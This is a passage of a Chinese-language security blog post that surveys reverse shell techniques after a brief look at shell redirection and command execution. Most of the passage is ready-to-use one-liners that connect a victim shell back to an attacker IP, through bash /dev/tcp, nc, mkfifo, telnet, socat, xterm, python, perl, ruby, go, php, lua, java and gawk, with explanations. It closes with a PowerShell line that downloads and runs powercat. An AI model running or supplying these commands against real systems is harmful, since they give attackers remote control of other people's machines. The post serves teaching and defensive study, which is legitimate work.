+<h4 id="5）exec-绑定重定向"><a href="#5）exec-绑定重定向" class="headerlink" title="5）exec 绑定重定向"></a>5）exec 绑定重定向</h4><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs excel">exec [<span class="hljs-built_in">n</span>] &lt;&gt; file/[<span class="hljs-built_in">n</span>]：以读写方式打开file指代的文件，并将<span class="hljs-built_in">n</span>重定向到该文件。如果<span class="hljs-built_in">n</span>不指定的话，默认为标准输入<br>exec [<span class="hljs-built_in">n</span>] &lt; file/[<span class="hljs-built_in">n</span>] <br>exec [<span class="hljs-built_in">n</span>] &gt; file/[<span class="hljs-built_in">n</span>]<br></code></pre></td></tr></table></figure>
+
+<p>使用 exec 指令，可以让重定向在接下来的会话中（多条指令）持续有效。</p>
+<p><img src="https://img2018.cnblogs.com/blog/532548/201912/532548-20191214114049434-1826483874.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p> <img src="https://img2018.cnblogs.com/blog/532548/201912/532548-20191214114254852-1959897938.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<h2 id="0x2：通过建立socket-tcp连接实现网络通信【4层协议】"><a href="#0x2：通过建立socket-tcp连接实现网络通信【4层协议】" class="headerlink" title="0x2：通过建立socket tcp连接实现网络通信【4层协议】"></a>0x2：通过建立socket tcp连接实现网络通信【4层协议】</h2><h2 id="0x3：使用ICMP实现网络通信【4层协议】"><a href="#0x3：使用ICMP实现网络通信【4层协议】" class="headerlink" title="0x3：使用ICMP实现网络通信【4层协议】"></a>0x3：使用ICMP实现网络通信【4层协议】</h2><h2 id="0x4：使用DNS实现网络通信【7层协议】"><a href="#0x4：使用DNS实现网络通信【7层协议】" class="headerlink" title="0x4：使用DNS实现网络通信【7层协议】"></a>0x4：使用DNS实现网络通信【7层协议】</h2><p><strong>Relevant Link:</strong> </p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>xz.aliyun.com<span class="hljs-regexp">/t/</span><span class="hljs-number">2548</span> <br></code></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.cnblogs.com/LittleHann/p/12038070.html#_labelTop">回到顶部(go to top)</a></p>
+<h1 id="3-命令执行（system-executor）方式讨论"><a href="#3-命令执行（system-executor）方式讨论" class="headerlink" title="3. 命令执行（system executor）方式讨论"></a>3. 命令执行（system executor）方式讨论</h1><h2 id="0x1：通过管道符传递指令"><a href="#0x1：通过管道符传递指令" class="headerlink" title="0x1：通过管道符传递指令"></a>0x1：通过管道符传递指令</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;hello&quot;</span> | <span class="hljs-built_in">cat</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="0x2：通过调用glibc-api执行系统指令"><a href="#0x2：通过调用glibc-api执行系统指令" class="headerlink" title="0x2：通过调用glibc api执行系统指令"></a>0x2：通过调用glibc api执行系统指令</h2><p>本质上来说，Linux系统中的ring3应用程序启动时都会加载glibc.so库，glibc库中对Linux系统调用实现了封装。应用程序可以像使用C库那样，安全地使用系统调用。</p>
+<h2 id="0x3：通过直接调用系统调用执行指令"><a href="#0x3：通过直接调用系统调用执行指令" class="headerlink" title="0x3：通过直接调用系统调用执行指令"></a>0x3：通过直接调用系统调用执行指令</h2><p>一般来说，应用程序可以通过glibc封装出的接口来使用系统调用，这样避免一些锁、传参检查等问题。但是技术上，应用程序完全也可以绕过glibc，直接发起syscall系统调用。</p>
+<p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.cnblogs.com/LittleHann/p/12038070.html#_labelTop">回到顶部(go to top)</a></p>
+<h1 id="4-反弹Shell攻击组合方式讨论"><a href="#4-反弹Shell攻击组合方式讨论" class="headerlink" title="4. 反弹Shell攻击组合方式讨论"></a>4. 反弹Shell攻击组合方式讨论</h1><p>有了之前对命令执行和网络通信方式底层原理的讨论之后，这一章开始，我们将其进行横向和纵向的组合，讨论具体的反弹Shell姿势，并对每种姿势的底层原理进行分析。</p>
+<h2 id="0x1：“重定向符”-”-x2F-dev-x2F-tcp网络通信”Bash反弹Shell"><a href="#0x1：“重定向符”-”-x2F-dev-x2F-tcp网络通信”Bash反弹Shell" class="headerlink" title="0x1：“重定向符”+”&#x2F;dev&#x2F;tcp网络通信”Bash反弹Shell"></a>0x1：“重定向符”+”&#x2F;dev&#x2F;tcp网络通信”Bash反弹Shell</h2><p>这一类反弹shell的本质是把bash&#x2F;zsh等进程的 0 1 2 输入输出重定向到远程socket，由socket中获取输入，重定向 标准输出（1）和错误输出（2）到socket。</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">attacker</span>机器上执行：<br><span class="hljs-attribute">nc</span> -lvp <span class="hljs-number">2333</span><br><br><span class="hljs-attribute">victim</span> 机器上执行：<br><span class="hljs-attribute">bash</span> -i &gt;&amp; /dev/tcp/<span class="hljs-number">192.168.146.129</span>/<span class="hljs-number">2333</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>“bash -i”：bash 是linux的一个比较常见的shell，除此之外还有 sh、zsh、等，他们之间有着细小差别</li>
+<li>“-i”：这个参数表示的是产生交互式的shell</li>
+<li>“&#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port”：&#x2F;dev&#x2F;tcp|udp&#x2F;ip&#x2F;port 这个文件可以将其看成一个设备（Linux下一切皆文件），对这个文件进行读写，就能实现与监听端口的服务器的socket通信</li>
+<li>”&gt;&amp;“：混合输出（错误、正确输出都输出到一个地方），避免受害者机器上依然能看到我们在攻击者机器中执行的指令</li>
+<li>0&gt;&amp;1：输入0是由 &#x2F;dev&#x2F;tcp&#x2F;192.168.146.129&#x2F;2333 输入的，也就是攻击机的输入，命令执行的结果1，会输出到 &#x2F;dev&#x2F;tcp&#x2F;192.168.146.129&#x2F;2333 上，这就形成了一个回路，实现了我们远程交互式shell 的功能<ul>
+<li><img src="https://img2018.cnblogs.com/blog/532548/201912/532548-20191215091731268-1852930532.png" srcset="/img/loading.gif" lazyload alt="img"></li>
+</ul>
+</li>
+</ul>
+<p>常见的变种命令行如下：</p>
+<ul>
+<li><p>方式一：显式用“2&gt;&amp;1”来对错误输出进行重定向 </p>
+<ul>
+<li>bash -i &gt; &#x2F;dev&#x2F;tcp&#x2F;192.168.146.129&#x2F;2333 0&gt;&amp;1 2&gt;&amp;1</li>
+</ul>
+</li>
+<li><p>方式二：唯一区别就是 0&gt;&amp;1 和 0&lt;&amp;1 ，其实就是打开方式的不同，而对于这个文件描述符来讲并没有什么区别</p>
+<ul>
+<li>bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.146.129&#x2F;2333 0&gt;&amp;1</li>
+<li>bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.146.129&#x2F;2333 0&lt;&amp;1</li>
+</ul>
+</li>
+<li><p>方式三：</p>
+<ul>
+<li>bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.146.129&#x2F;2333 &lt;&amp;2</li>
+<li>bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.146.129&#x2F;2333 0&lt;&amp;2</li>
+<li><img src="https://img2018.cnblogs.com/blog/532548/201912/532548-20191215093600154-402836042.png" srcset="/img/loading.gif" lazyload alt="img"></li>
+</ul>
+</li>
+<li><p>方式四：</p>
+<ul>
+<li>exec 5&lt;&gt;&#x2F;dev&#x2F;tcp&#x2F;192.168.146.129&#x2F;2333;cat &lt;&amp;5|while read line;do $line &gt;&amp;5 2&gt;&amp;1;done<ul>
+<li>“exec 5&lt;&gt;&#x2F;dev&#x2F;tcp&#x2F;192.168.146.129&#x2F;2333”：这一句将文件描述符5重定向到了 &#x2F;dev&#x2F;tcp&#x2F;192.168.146.129&#x2F;2333 并且方式是读写方式，于是我们就能通过文件描述符对这个socket连接进行操作了</li>
+<li>“command|while read line do …..done”：从文件中依次读取每一行，将其赋值给 line 变量（这里变量可以很多，以空格分隔），之后再在循环中对line进行操作。</li>
+<li>”&gt;&amp;5 2&gt;&amp;1“：使用管道符对攻击者机器上输入的命令依次执行，并将标准输出和标准错误输出都重定向到了文件描述符5，也就是攻击机上，实现交互式shell的功能</li>
+</ul>
+</li>
+<li>0&lt;&amp;196;exec 196&lt;&gt;&#x2F;dev&#x2F;tcp&#x2F;192.168.146.129&#x2F;4444; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</li>
+</ul>
+</li>
+<li><p>方式五：</p>
+<ul>
+<li>rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 192.168.146.129 2333 &gt;&#x2F;tmp&#x2F;f<ul>
+<li>“mkfifo”：首先创建了一个管道</li>
+<li>“cat”：将管道里面的内容输出传递给&#x2F;bin&#x2F;sh</li>
+<li>“&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc …. &gt; &#x2F;tmp&#x2F;f”：sh会执行管道里的命令并将标准输出和标准错误输出结果通过nc 传到该管道，由此形成了一个回路</li>
+</ul>
+</li>
+<li>mknod backpipe p; nc 192.168.146.129 2333 0&lt;backpipe | &#x2F;bin&#x2F;bash 1&gt;backpipe 2&gt;backpipe</li>
+</ul>
+</li>
+</ul>
+<h2 id="0x2：第三方软件内置“socket通信”-“指令交互”实现反弹shel功能"><a href="#0x2：第三方软件内置“socket通信”-“指令交互”实现反弹shel功能" class="headerlink" title="0x2：第三方软件内置“socket通信”+“指令交互”实现反弹shel功能"></a>0x2：第三方软件内置“socket通信”+“指令交互”实现反弹shel功能</h2><p>第三方软件可以通过编译性或者解释性语言，在内部实现系统命中的调用执行以及网络双向通信的功能。理论上说，这类方式的变化是无限的。</p>
+<h3 id="1-nc"><a href="#1-nc" class="headerlink" title="1. nc"></a>1. nc</h3><p>nc 如果安装了正确的版本（存在-e 选项就能直接反弹shell）</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -e /bin/sh <span class="hljs-number">192.168.146.129</span> <span class="hljs-number">2333</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="2-telnet反弹shell"><a href="#2-telnet反弹shell" class="headerlink" title="2. telnet反弹shell"></a>2. telnet反弹shell</h3><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs llvm">mknod a p<span class="hljs-comment">; telnet 10.211.55.2 7777 0&lt;a | /bin/bash 1&gt;a</span><br>telnet <span class="hljs-keyword">x</span>.<span class="hljs-keyword">x</span>.<span class="hljs-keyword">x</span>.<span class="hljs-keyword">x</span> <span class="hljs-number">6666</span> | /bin/bash | telnet <span class="hljs-keyword">x</span>.<span class="hljs-keyword">x</span>.<span class="hljs-keyword">x</span>.<span class="hljs-keyword">x</span> <span class="hljs-number">5555</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="3-socat反弹shell"><a href="#3-socat反弹shell" class="headerlink" title="3. socat反弹shell"></a>3. socat反弹shell</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 监听命令</span><br>socat file:`<span class="hljs-built_in">tty</span>`,raw,<span class="hljs-built_in">echo</span>=0 tcp-listen:9999<br><br><span class="hljs-comment"># 反弹命令</span><br>socat <span class="hljs-built_in">exec</span>:<span class="hljs-string">&#x27;bash -li&#x27;</span>,pty,stderr,setsid,sigint,sane tcp:10.211.55.2:9999<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://img2018.cnblogs.com/blog/532548/201912/532548-20191215201848293-652984613.png" srcset="/img/loading.gif" lazyload alt="img"> </p>
+<h3 id="4-Xterm"><a href="#4-Xterm" class="headerlink" title="4. Xterm"></a>4. Xterm</h3><p><a href="javascript:void(0);"><img src="https://common.cnblogs.com/images/copycode.gif" srcset="/img/loading.gif" lazyload alt="复制代码"></a></p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-comment"># 在主控端配置</span><br><span class="hljs-comment"># 开启Xserver：　　# TCP 6001</span><br>Xnest :<span class="hljs-number">1</span>                <br><br><span class="hljs-comment"># 授予目标机连回来的权限：</span><br>xterm -<span class="hljs-keyword">display </span><span class="hljs-number">127</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>:<span class="hljs-number">1</span>          <span class="hljs-comment"># Run this OUTSIDE the Xnest, another tab</span><br>xhost +targetip                         <span class="hljs-comment"># Run this INSIDE the spawned xterm on the open X Server</span><br><span class="hljs-comment"># 如果想让任何人都连上：</span><br>xhost +                      <br><br><span class="hljs-comment"># 在受控端执行</span><br><span class="hljs-comment"># 假设xterm已安装，连回你的Xserver：</span><br>xterm -<span class="hljs-keyword">display </span>attackerip:<span class="hljs-number">1</span><br>或者：<br>$ <span class="hljs-keyword">DISPLAY=attackerip:0 </span>xterm<br></code></pre></td></tr></table></figure>
+
+<p><a href="javascript:void(0);"><img src="https://common.cnblogs.com/images/copycode.gif" srcset="/img/loading.gif" lazyload alt="复制代码"></a></p>
+<h2 id="0x3：“管道符”-“socket网络通信”实现bash反弹shell"><a href="#0x3：“管道符”-“socket网络通信”实现bash反弹shell" class="headerlink" title="0x3：“管道符”+ “socket网络通信”实现bash反弹shell"></a>0x3：“管道符”+ “socket网络通信”实现bash反弹shell</h2><h3 id="1-基于匿名管道（pipe）传递指令流"><a href="#1-基于匿名管道（pipe）传递指令流" class="headerlink" title="1. 基于匿名管道（pipe）传递指令流"></a>1. 基于匿名管道（pipe）传递指令流</h3><p>匿名管道（pipe）是内核中的一个单向数据通道，管道有一个读端和一个写端。一般用于父子进程之间的通信。</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># client</span><br><span class="hljs-attribute">nc</span> <span class="hljs-number">192.168.43.146</span> <span class="hljs-number">7777</span> | /bin/bash | nc <span class="hljs-number">192.168.43.146</span> <span class="hljs-number">8888</span><br><span class="hljs-comment"># server</span><br><span class="hljs-attribute">ncat</span> -lvvp <span class="hljs-number">7777</span><br><span class="hljs-comment"># server </span><br><span class="hljs-attribute">ncat</span> -lvvp <span class="hljs-number">8888</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://img2018.cnblogs.com/blog/532548/201912/532548-20191215104646111-1137243959.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>bash进程的输入输出都来自其他进程的pipe。</p>
+<h3 id="2-基于命名管道（fifo）"><a href="#2-基于命名管道（fifo）" class="headerlink" title="2. 基于命名管道（fifo）"></a>2. 基于命名管道（fifo）</h3><p>fifo是命名管道也被称为FIFO文件，它是一种特殊类型的文件，它在文件系统中以文件名的形式存在（因为多个进程要识别），它的行为和匿名管道类似（一端读一端写），但是FIFO文件也不在磁盘进行存储。一般用于进程间的通信。</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">rm <span class="hljs-regexp">/tmp/</span>f;mkfifo <span class="hljs-regexp">/tmp/</span>f;cat <span class="hljs-regexp">/tmp/</span>f|<span class="hljs-regexp">/bin/</span>sh -i <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span>|nc <span class="hljs-number">110.211</span>.<span class="hljs-number">55.2</span> <span class="hljs-number">7777</span> &gt;<span class="hljs-regexp">/tmp/</span>f<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>mkfifo 命令首先创建了一个管道</li>
+<li>cat 将管道里面的内容输出传递给&#x2F;bin&#x2F;sh</li>
+<li>sh会执行管道里的命令并将标准输出和标准错误输出结果通过 nc 传到该管道，由此形成了一个回路</li>
+</ul>
+<h2 id="0x4：git解释性脚本语言反弹shell"><a href="#0x4：git解释性脚本语言反弹shell" class="headerlink" title="0x4：git解释性脚本语言反弹shell"></a>0x4：git解释性脚本语言反弹shell</h2><h3 id="1-python反弹shell"><a href="#1-python反弹shell" class="headerlink" title="1. python反弹shell"></a>1. python反弹shell</h3><p><a href="javascript:void(0);"><img src="https://common.cnblogs.com/images/copycode.gif" srcset="/img/loading.gif" lazyload alt="复制代码"></a></p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">python -c <span class="hljs-string">&quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#x27;ip&#x27;,port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#x27;/bin/bash&#x27;,&#x27;-i&#x27;]);&quot;</span><br><br><span class="hljs-comment"># 拆成多行方便阅读</span><br>import os,<span class="hljs-built_in">socket</span>,subprocess<br>s=<span class="hljs-built_in">socket</span>.<span class="hljs-built_in">socket</span>(<span class="hljs-built_in">socket</span>.AF_INET,<span class="hljs-built_in">socket</span>.SOCK_STREAM)<br>s.connect((<span class="hljs-string">&#x27;ip&#x27;</span>,port))<br>os.dup2(s.fileno(),<span class="hljs-number">0</span>)<br>os.dup2(s.fileno(),<span class="hljs-number">1</span>)<br>os.dup2(s.fileno(),<span class="hljs-number">2</span>)<br>p=subprocess.call([<span class="hljs-string">&#x27;/bin/bash&#x27;</span>,<span class="hljs-string">&#x27;-i&#x27;</span>])<br></code></pre></td></tr></table></figure>
+
+<p><a href="javascript:void(0);"><img src="https://common.cnblogs.com/images/copycode.gif" srcset="/img/loading.gif" lazyload alt="复制代码"></a></p>
+<ul>
+<li>使用duo2方法将第二个形参（文件描述符）指向第一个形参（socket链接）<ul>
+<li>os.dup2(s.fileno(),0)</li>
+<li>os.dup2(s.fileno(),1)</li>
+<li>os.dup2(s.fileno(),2)</li>
+</ul>
+</li>
+<li>使用os的subprocess在本地开启一个子进程，启动bash交互模式，标准输入、标准输出、标准错误输出被重定向到了远程</li>
+</ul>
+<h3 id="2-perl反弹shell"><a href="#2-perl反弹shell" class="headerlink" title="2. perl反弹shell"></a>2. perl反弹shell</h3><p><a href="javascript:void(0);"><img src="https://common.cnblogs.com/images/copycode.gif" srcset="/img/loading.gif" lazyload alt="复制代码"></a></p>
+<figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs tcl">perl -e &#x27;use Socket;<span class="hljs-variable">$i</span>=”<span class="hljs-number">10.211</span><span class="hljs-number">.55</span><span class="hljs-number">.2</span><span class="hljs-string">&quot;;$p=7777;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;</span>tcp<span class="hljs-string">&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;</span>&gt;&amp;S<span class="hljs-string">&quot;);open(STDOUT,&quot;</span>&gt;&amp;S<span class="hljs-string">&quot;);open(STDERR,&quot;</span>&gt;&amp;S<span class="hljs-string">&quot;);exec(&quot;</span>/bin/sh -i<span class="hljs-string">&quot;);&#125;;&#x27;</span><br><span class="hljs-string"></span><br><span class="hljs-string"># 拆成多行方便阅读</span><br><span class="hljs-string">use Socket</span><br><span class="hljs-string">$i=”10.211.55.2&quot;</span><br><span class="hljs-variable">$p</span>=<span class="hljs-number">7777</span><br><span class="hljs-keyword">socket</span>(S,PF_INET,SOCK_STREAM,getprotobyname(<span class="hljs-string">&quot;tcp&quot;</span>))<br><span class="hljs-keyword">if</span>(connect(S,sockaddr_in(<span class="hljs-variable">$p</span>,inet_aton(<span class="hljs-variable">$i</span>))))&#123;<br>    <span class="hljs-keyword">open</span>(STDIN,<span class="hljs-string">&quot;&gt;&amp;S&quot;</span>)<br>    <span class="hljs-keyword">open</span>(STDOUT,<span class="hljs-string">&quot;&gt;&amp;S&quot;</span>)<br>    <span class="hljs-keyword">open</span>(STDERR,<span class="hljs-string">&quot;&gt;&amp;S&quot;</span>)<br>    <span class="hljs-keyword">exec</span>(<span class="hljs-string">&quot;/bin/sh -i&quot;</span>)<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><a href="javascript:void(0);"><img src="https://common.cnblogs.com/images/copycode.gif" srcset="/img/loading.gif" lazyload alt="复制代码"></a></p>
+<h3 id="3-ruby反弹shell"><a href="#3-ruby反弹shell" class="headerlink" title="3. ruby反弹shell"></a>3. ruby反弹shell</h3><figure class="highlight fsharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs fsharp">ruby <span class="hljs-operator">-</span>rsocket <span class="hljs-operator">-</span>e&#x27;f<span class="hljs-operator">=</span>TCPSocket.<span class="hljs-keyword">open</span>(<span class="hljs-string">&quot;10.0.0.1&quot;</span>,<span class="hljs-number">1234</span>).to_i;exec <span class="hljs-built_in">sprintf</span>(<span class="hljs-string">&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;</span>,f,f,f)’<br></code></pre></td></tr></table></figure>
+
+<h3 id="4-go反弹shell"><a href="#4-go反弹shell" class="headerlink" title="4. go反弹shell"></a>4. go反弹shell</h3><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">echo &#x27;package main;import<span class="hljs-string">&quot;os/exec&quot;</span>;import<span class="hljs-string">&quot;net&quot;</span>;func main()&#123;c,<span class="hljs-symbol">_</span>:=net.Dial(<span class="hljs-string">&quot;tcp&quot;</span>,<span class="hljs-string">&quot;192.168.0.134:8080&quot;</span>);cmd:=exec.Command(<span class="hljs-string">&quot;/bin/sh&quot;</span>);cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()&#125;&#x27; &gt; /tmp/t.<span class="hljs-built_in">go</span> &amp;&amp; <span class="hljs-built_in">go</span> run /tmp/t.<span class="hljs-built_in">go</span> &amp;&amp; rm /tmp/t.<span class="hljs-built_in">go</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="5-php反弹shell"><a href="#5-php反弹shell" class="headerlink" title="5. php反弹shell"></a>5. php反弹shell</h4><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">php –r  <span class="hljs-symbol">&#x27;exec</span>(<span class="hljs-string">&quot;/bin/bash -i &gt;&amp; /dev/tcp/127.0.0.1/7777&quot;</span>)’<br></code></pre></td></tr></table></figure>
+
+<h3 id="6-lua反弹shell"><a href="#6-lua反弹shell" class="headerlink" title="6. lua反弹shell"></a>6. lua反弹shell</h3><figure class="highlight csp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csp">lua -e &quot;require(<span class="hljs-string">&#x27;socket&#x27;</span>);require(<span class="hljs-string">&#x27;os&#x27;</span>);t=socket.tcp();t:connect(<span class="hljs-string">&#x27;10.0.0.1&#x27;</span>,<span class="hljs-string">&#x27;1234&#x27;</span>);os.execute(<span class="hljs-string">&#x27;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#x27;</span>);&quot;<br></code></pre></td></tr></table></figure>
+
+<h3 id="7-java"><a href="#7-java" class="headerlink" title="7. java"></a>7. java</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">r = Runtime<span class="hljs-selector-class">.getRuntime</span>()<br><span class="hljs-selector-tag">p</span> = r<span class="hljs-selector-class">.exec</span>(<span class="hljs-selector-attr">[<span class="hljs-string">&quot;/bin/bash&quot;</span>,<span class="hljs-string">&quot;-c&quot;</span>,<span class="hljs-string">&quot;exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;</span>]</span> as String<span class="hljs-selector-attr">[]</span>)<br><span class="hljs-selector-tag">p</span><span class="hljs-selector-class">.waitFor</span>()<br></code></pre></td></tr></table></figure>
+
+<h3 id="8-gawk"><a href="#8-gawk" class="headerlink" title="8. gawk"></a>8. gawk</h3><p><a href="javascript:void(0);"><img src="https://common.cnblogs.com/images/copycode.gif" srcset="/img/loading.gif" lazyload alt="复制代码"></a></p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment">#!/usr/bin/gawk -f</span><br><br>BEGIN &#123;<br>       <span class="hljs-built_in"> Port </span>   =       8080<br>        Prompt  =       <span class="hljs-string">&quot;bkd&gt; &quot;</span><br><br>       <span class="hljs-built_in"> Service </span>= <span class="hljs-string">&quot;/inet/tcp/&quot;</span><span class="hljs-built_in"> Port </span><span class="hljs-string">&quot;/0/0&quot;</span><br>        <span class="hljs-keyword">while</span> (1) &#123;<br>                <span class="hljs-keyword">do</span> &#123;<br>                        printf Prompt |&amp;<span class="hljs-built_in"> Service</span><br><span class="hljs-built_in"></span>                       <span class="hljs-built_in"> Service </span>|&amp; getline cmd<br>                        <span class="hljs-keyword">if</span> (cmd) &#123;<br>                                <span class="hljs-keyword">while</span> ((cmd |&amp; getline) &gt; 0)<br>                                        <span class="hljs-built_in">print</span> <span class="hljs-variable">$0</span> |&amp;<span class="hljs-built_in"> Service</span><br><span class="hljs-built_in"></span>                                close(cmd)<br>                        &#125;<br>                &#125; <span class="hljs-keyword">while</span> (cmd != <span class="hljs-string">&quot;exit&quot;</span>)<br>                close(Service)<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><a href="javascript:void(0);"><img src="https://common.cnblogs.com/images/copycode.gif" srcset="/img/loading.gif" lazyload alt="复制代码"></a></p>
+<h3 id="9-powershell反弹shell"><a href="#9-powershell反弹shell" class="headerlink" title="9. powershell反弹shell"></a>9. powershell反弹shell</h3><p>powershell反弹shell本质上是一些多功能代码集合，通过调用windows提供的api接口实现网络通信和指令解析执行的功能。</p>
+<h4 id="1）powercat反弹shell"><a href="#1）powercat反弹shell" class="headerlink" title="1）powercat反弹shell"></a>1）powercat反弹shell</h4><p><a href="javascript:void(0);"><img src="https://common.cnblogs.com/images/copycode.gif" srcset="/img/loading.gif" lazyload alt="复制代码"></a></p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-comment"># 攻击者(192.168.159.134)开启监听：</span><br><span class="hljs-attribute">nc</span> -lvp <span class="hljs-number">6666</span><br><span class="hljs-comment"># 或者使用powercat监听</span><br>powercat -l -p <span class="hljs-number">6666</span><br><br><span class="hljs-comment"># 目标机反弹cmd shell：</span><br>powershell IEX (New-Object System.Net.Webclient).DownloadString<br>(<span class="hljs-string">&#x27;https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&#x27;</span>);<br><span class="hljs-attribute">powercat</span> -c <span class="hljs-number">192.168.159.134</span> -p <span class="hljs-number">6666</span> -e cmd<br></code></pre></td></tr></table></figure>
+
+<p><a href="javascript:void(0);"><img src="https://common.cnblogs.com/images/copycode.gif" srcset="/img/loading.gif" lazyload alt="复制代码"></a></p>
